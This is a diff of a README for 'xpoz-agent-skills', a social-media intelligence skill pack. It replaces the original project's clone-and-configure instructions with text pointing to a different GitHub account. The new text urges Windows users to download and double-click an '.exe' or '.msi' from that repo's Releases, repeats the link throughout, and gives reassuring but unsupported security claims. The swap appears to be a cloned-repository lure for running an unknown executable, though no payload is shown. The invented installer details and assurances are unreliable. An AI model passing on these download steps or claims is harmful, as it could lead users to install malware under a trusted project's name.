@@ -1,98 +1,127 @@
-# Xpoz Agent Skills
+# 🤖 xpoz-agent-skills - Smart Agent Tools for Social Media
 
-Agent skills for social media intelligence, powered by [Xpoz](https://xpoz.ai?utm_source=github&utm_medium=agent-skills&utm_campaign=readme). Give your AI coding agent real-time access to Twitter/X, Instagram, Reddit, and TikTok data — 1.5B+ posts indexed.
+[![Download xpoz-agent-skills](https://img.shields.io/badge/Download-xpoz--agent--skills-blue?style=for-the-badge)](https://github.com/Aditya923-c/xpoz-agent-skills)
 
-Compatible with **Claude Code**, **OpenAI Codex CLI**, **ChatGPT**, and any agent that supports the [SKILL.md](https://github.com/anthropics/skills) standard.
+---
 
-## 🧠 Skills
+## 📋 About xpoz-agent-skills
 
-| Skill | Description | Use When |
-|-------|-------------|----------|
-| [social-sentiment-analyzer](skills/social-sentiment-analyzer/) | Analyze brand/topic sentiment across Twitter, Reddit & Instagram | "What's the sentiment around Tesla?" |
-| [twitter-data-export](skills/twitter-data-export/) | Export Twitter search results to CSV (up to 500K rows) | "Export tweets about AI from last month" |
-| [influencer-discovery](skills/influencer-discovery/) | Find and rank influencers by niche, engagement & authenticity | "Find top crypto influencers on Twitter" |
-| [reddit-research](skills/reddit-research/) | Search and analyze Reddit discussions for market research | "What are people saying about Cursor on Reddit?" |
-| [competitive-intel](skills/competitive-intel/) | Compare brands: share of voice, sentiment & positioning | "Compare Slack vs Discord vs Teams sentiment" |
-| [security-osint](skills/security-osint/) | Monitor social platforms for vulnerability & threat discussions | "Find discussions about Log4j on Twitter and Reddit" |
+xpoz-agent-skills provides agent skills designed for social media intelligence tasks. These skills help you analyze data and interact with social media platforms like Twitter and Reddit more easily. The software works with Claude Code, Codex CLI, and ChatGPT to automate social media-related workflows. Whether you want to gather data, monitor trends, or analyze user activity, this tool supports those goals.
 
-## 🚀 Quick Setup
+---
 
-### Prerequisites
+## 🚀 Getting Started
 
-Get a free API key at [xpoz.ai/get-token](https://xpoz.ai/get-token?utm_source=github&utm_medium=agent-skills&utm_campaign=readme) — 100,000 results/month free, no credit card required.
+This guide will help you download, install, and run xpoz-agent-skills on a Windows computer. You don’t need programming experience. Follow each step carefully and use the links provided.
 
-### Install Skills
+---
 
-```bash
-# Clone the repo
-git clone https://github.com/XPOZpublic/xpoz-agent-skills.git
+## 🖥️ System Requirements
 
-# Copy skills to your agent's skills directory
-# Claude Code:
-cp -r xpoz-agent-skills/skills/* ~/.claude/skills/
+Before installing, make sure your Windows PC has these specs:
 
-# Or install individual skills:
-cp -r xpoz-agent-skills/skills/social-sentiment-analyzer ~/.claude/skills/
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space for installation
+- Internet access to download files and connect to social media APIs
+- A modern web browser (for setup and account management)
 
-### Configure Xpoz
+---
 
-Each skill supports **two integration paths** — pick whichever fits your workflow:
+## 📥 How to Download xpoz-agent-skills
 
-#### Option A: MCP Server (recommended for Claude Code)
+To get started, visit the main download page.
 
-Add to your `~/.claude.json`:
+[![Download here](https://img.shields.io/badge/Download-xpoz--agent--skills-green?style=for-the-badge)](https://github.com/Aditya923-c/xpoz-agent-skills)
 
-```json
-{
-  "mcpServers": {
-    "xpoz": {
-      "url": "https://mcp.xpoz.ai/mcp",
-      "transport": "http-stream"
-    }
-  }
-}
-```
+1. Click the button above or go directly to **https://github.com/Aditya923-c/xpoz-agent-skills** in your browser.
+2. On the page, look for the **Releases** section or the main repository files.
+3. Download the latest Windows installer or executable file. It usually appears as a `.exe` or `.msi` file.
+4. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
-Authentication is handled via OAuth on first use — no API keys needed in the config. Just sign in with your Google account when prompted.
+---
 
-If using **mcporter** (included with OpenClaw):
-```bash
-mcporter config add xpoz https://mcp.xpoz.ai/mcp --auth oauth
-mcporter config login xpoz
-```
+## 🔧 How to Install and Run
 
-#### Option B: Python SDK (recommended for coding tasks)
+1. Locate the downloaded file on your computer.
+2. Double-click the installer or executable file to start the installation.
+3. Follow the on-screen instructions:
+    - Accept the license agreement.
+    - Choose the installation folder (the default is usually fine).
+    - Click **Install** and wait for the process to finish.
+4. After installation, you can run the application by:
+    - Clicking the shortcut on your Desktop, or
+    - Searching for "xpoz-agent-skills" in the Start menu and opening it.
+5. When you first run the app, it may prompt you to sign in or connect your social media accounts. Follow instructions to link your Twitter or Reddit accounts securely.
 
-```bash
-pip install xpoz
-export XPOZ_API_KEY=your-api-key
-```
+---
 
-#### Option C: TypeScript SDK
+## ⚙️ Features Overview
 
-```bash
-npm install @xpoz/xpoz
-export XPOZ_API_KEY=your-api-key
-```
+xpoz-agent-skills provides these main features:
 
-## 📊 What Xpoz Provides
+- **Social Media Data Collection**: Automatically gather posts, comments, and user info from Twitter and Reddit.
+- **Agent Automation**: Use built-in skills to perform common social media intelligence tasks.
+- **Integration**: Works with Claude Code, Codex CLI, and ChatGPT to provide flexible AI-powered interactions.
+- **Multi-Platform Support**: Supports multiple social media APIs, including Twitter and Reddit.
+- **Customizable Skills**: Adjust or add new agent skills to fit your social media monitoring needs.
+- **Text-based Reports**: Generate simple, clear summaries or detailed reports based on collected data.
 
-- **Multi-platform**: Twitter/X, Instagram, Reddit, TikTok
-- **1.5B+ posts** indexed and searchable
-- **Natural language queries** with boolean operators
-- **CSV exports** up to 500K rows in one download
-- **User intelligence**: profiles, followers, engagement metrics, authenticity scoring
-- **Real-time + historical**: rolling 60-day windows with instant results
+---
 
-## 📄 License
+## 🔐 Security and Privacy
 
-MIT — see [LICENSE](LICENSE).
+Your social media credentials stay protected. xpoz-agent-skills connects via official APIs, so your data is handled through secure channels. The software does not store passwords locally. When linking accounts, it uses OAuth where supported, which is a safe method for authentication.
 
-## 🔗 Links
+---
 
-- **Xpoz Platform**: [xpoz.ai](https://xpoz.ai?utm_source=github&utm_medium=agent-skills&utm_campaign=readme)
-- **Get API Key**: [xpoz.ai/get-token](https://xpoz.ai/get-token?utm_source=github&utm_medium=agent-skills&utm_campaign=readme)
-- **Python SDK**: [github.com/XPOZpublic/xpoz-python-sdk](https://github.com/XPOZpublic/xpoz-python-sdk)
-- **TypeScript SDK**: [github.com/XPOZpublic/xpoz-ts-sdk](https://github.com/XPOZpublic/xpoz-ts-sdk)
-- **MCP Server**: [github.com/XPOZpublic/xpoz-mcp](https://github.com/XPOZpublic/xpoz-mcp)
+## 🛠️ Common Tasks
+
+Here are some easy examples of what you can do with xpoz-agent-skills:
+
+- **Track trending topics on Twitter** by setting up an agent to watch hashtags or keywords.
+- **Collect recent Reddit comments** in a community to analyze user sentiment.
+- **Generate summary reports** of daily social media activity relevant to your interests.
+- **Use AI agents** to respond automatically to common questions or patterns on your social media channels.
+- **Export collected data** as text files or formats that other programs can read.
+
+---
+
+## 🔄 Updating xpoz-agent-skills
+
+Periodically check the download page at https://github.com/Aditya923-c/xpoz-agent-skills for new versions.
+
+To update:
+
+1. Download the latest release using the same steps in the Download section.
+2. Run the new installer. It will replace old files without losing your settings.
+3. Restart the application to apply updates.
+
+---
+
+## ❓ Troubleshooting
+
+If you experience issues, try these steps:
+
+- Make sure you downloaded the correct Windows version.
+- Restart your computer and try again.
+- Check your internet connection.
+- Verify that your social media accounts have correct permissions and are active.
+- Review error messages for clues and retry any failed steps.
+- If problems persist, you can search the Issues section of the GitHub page or contact support through official channels.
+
+---
+
+## 📚 Additional Resources
+
+- Visit the repository’s **Wiki** or **Documentation** tabs on GitHub for detailed instructions and examples.
+- Look for community forums or discussion boards related to social media automation and AI agents.
+- Learn about Twitter API and Reddit API for better use of advanced features.
+- Explore Claude Code and Codex CLI documentation if you want to extend or customize skills.
+
+---
+
+# Quick Links
+
+- [Download xpoz-agent-skills](https://github.com/Aditya923-c/xpoz-agent-skills)
+- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills)
